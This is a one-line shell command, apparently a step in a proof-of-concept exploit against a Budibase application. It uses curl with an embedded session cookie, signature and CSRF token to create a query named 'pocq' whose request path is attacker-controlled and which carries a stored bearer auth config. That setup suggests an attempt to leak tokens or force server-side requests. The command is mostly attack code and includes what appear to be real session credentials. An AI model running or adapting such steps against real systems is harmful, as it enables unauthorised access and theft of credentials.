QID=$(curl -s -X POST \"https://hasinocompany.budibase.app/api/queries\" -H \"Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0\" -H \"x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec\" -H \"x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415\" -H \"Content-Type: application/json\" -d \"{\\"datasourceId\\":\\"$DSID\\",\\"name\\":\\"pocq\\",\\"parameters\\":[{\\"name\\":\\"t\\",\\"default\\":\\"\\"}],\\"fields\\":{\\"path\\":\\"{{ t }}\\",\\"bodyType\\":\\"none\\",\\"authConfigId\\":\\"ac1\\",\\"authConfigType\\":\\"bearer\\"},\\"queryVerb\\":\\"read\\",\\"transformer\\":\\"return data\\",\\"schema\\":{},\\"readable\\":true}\" | python3 -c \"import sys,json;print(json.load(sys.stdin)['_id'])\"); echo \"query=$QID\"
